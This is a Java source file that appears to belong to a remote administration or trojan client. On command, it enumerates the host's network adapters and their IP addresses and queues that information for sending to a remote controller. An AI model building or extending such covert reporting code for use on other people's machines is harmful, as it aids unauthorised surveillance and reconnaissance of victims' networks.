package com.redpois0n.packets;

import java.net.InetAddress;
import java.net.NetworkInterface;
import java.util.ArrayList;
import java.util.Collections;
import java.util.Enumeration;

import com.redpois0n.Connection;


public class PacketLISTAD extends AbstractPacket {

	@Override
	public void read(String line) throws Exception {
		Enumeration<NetworkInterface> nets = NetworkInterface.getNetworkInterfaces();
		for (NetworkInterface netint : Collections.list(nets)) {
			PacketBuilder packet = new PacketBuilder(Header.NETWORK_ADAPTER);
			packet.add(netint.getDisplayName());
			packet.add(netint.getName());

			ArrayList<InetAddress> list = Collections.list(netint.getInetAddresses());
			packet.add(list.size());
			for (InetAddress inetAddress : list) {
				packet.add(inetAddress.getHostAddress());
			}
			
			Connection.addToSendQueue(packet);
		}
	}

}
